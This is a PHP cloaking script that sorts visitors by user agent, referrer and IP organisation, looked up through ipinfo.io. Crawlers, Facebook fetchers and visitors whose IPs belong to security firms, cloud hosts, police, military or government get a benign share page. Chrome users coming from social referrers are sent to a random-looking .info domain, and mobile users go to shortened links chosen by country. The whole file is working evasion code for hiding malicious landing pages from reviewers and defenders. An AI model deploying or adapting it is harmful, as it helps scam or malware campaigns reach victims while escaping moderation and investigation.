<?php
  header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
  header('Access-Control-Allow-Methods: GET');
  header('X-Frame-Options: DENY');

  function getUserIP() {
      if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
          if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
              $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
              return trim($addr[0]);
          } else {
              return $_SERVER['HTTP_X_FORWARDED_FOR'];
          }
      }
      else {
          return $_SERVER['REMOTE_ADDR'];
      }
  }

  function generate_name($length){
      $rname = '';
      $sesli = 'aeiou';
      $sessiz = 'bcdfghjklmnprstvyz';
      $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
      for($n=0;$n<$length;$n++){
          if(in_array($rname[strlen($rname)-1], str_split($sesli))){
              $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
          }else{
              $rname .= $sesli[rand(0,strlen($sesli)-1)];
          }
      }
      return $rname;
  }

  function getORG(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/org');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $org = curl_exec($ch);
    curl_close($ch);
    return $org;
  }

  function getCountry(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.getUserIP().'/country');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $org = curl_exec($ch);
    curl_close($ch);
    return $org;
  }

  $action = 'theme';

  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  $detect = new Mobile_Detect;
  $browser = new Browser();

  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
    $action = 'theme';
  }else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
    $action = 'theme';
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = 'site';
  }

  $_SERVER["HTTP_USER_AGENT"] = isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : "";

  if(strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false){
    $action = 'theme';
  }

  if($action == 'site'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
    $action = 'theme';
    foreach ($refs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'site';
        break;
      }
    }
  }

  if($action == 'site'){
    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
  }else if($action == 'mobile'){
    $asnlist = array('Facebook','facebook','Google','google','Cloudflare','cloudflare','linode','Linode','level 3 communications','kaspersky', 'Level 3 Communications','Kaspersy','Mcafee','mcafee','akamai international', 'neustar','amazon','microsoft','digitalocean','leaseweb','radore','avast','qsc ag','radix','dynamic network services','eset','ovh sas','icann','Akamai International','NeuStar','Amazon','Microsoft', 'Digital Ocean', 'LeaseWeb', 'Radore', 'AVAST', 'QSC AG', 'Radix', 'ICANN', 'Dynamic Network Services', 'ESET', 'OVH SAS','google','SoftLayer','dropbox','coloc','Maktek','fbi','Netguard','data-center','Data Center','LEPL','ministarstvo','ministry','McAfee','hurricane','justic','navy','Black Fox Limited','WholeSale','redstation','Privax','trafficholder','rackspace','defense','ocean','Zscaler','Steadfast Networks','Facebook','Microsoft','CtrlS Datacenters','Federal','SingleHop','Reliablehosting.com','QuadraNet','Leaseweb USA','Leaseweb Germany GmbH','Dedicated Server Hosting','Screen Saver','datacent','security','amazon','intel','govern','leaseweb','interpol','serve','US Internet Corp','bitdefender','admin','cyber','layer','linode','apple','crime','azure','micro','serve','dedi','cloud','host','cisco','facebook','polic','leaseweb','node','bing','google','isprime','court', 'DOGAN', 'INETLTD', 'TELLCOM', 'AS197328', 'NETHOUSE', 'KOCNET', 'ASTURKNET', 'ULAKNET', 'ESOESNET', 'AS43260', 'AS198436', 'AS62054', 'DORUKNET', 'Digital Energy Technologies', 'WEDOS', 'ITLAS', 'TRABIA', 'Transip');
  }

  if($action != 'theme'){
    $org = getORG();
    foreach ($asnlist as $asn) {
      if(strpos(strtolower($org), strtolower($asn)) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if($action != 'theme'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $bannedrefs = array('facebook.com/lsr.php');
    foreach ($bannedrefs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'theme';
        break;
      }
    }
  }

  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    $action = 'theme';
  }

  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
    $action = 'theme';
  }

  $id = @$_SERVER["REQUEST_URI"];
  if(empty($id) || $id == "" || $id == "/"){
    $id = generate_name(rand(5,10));
  }
  $id = isset(explode("/", $id)[1]) ? explode("/", $id)[1] : $id;
  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;

  if($action == 'mobile'){
    if (getCountry() == "TR") {
      header('Location: https://goo.gl/O3CLpb');
    } else {
      header('Location: https://goo.gl/2lJlph');
    }
    exit;
  }else if($action == 'site'){
    header("Location: http://xkkdiqis.info/$id.jpg");
    exit;
  }else{
    @ob_end_clean();
    @ob_end_flush();
    //header("HTTP/1.1 301");
    require_once('share.php');
  }
?>
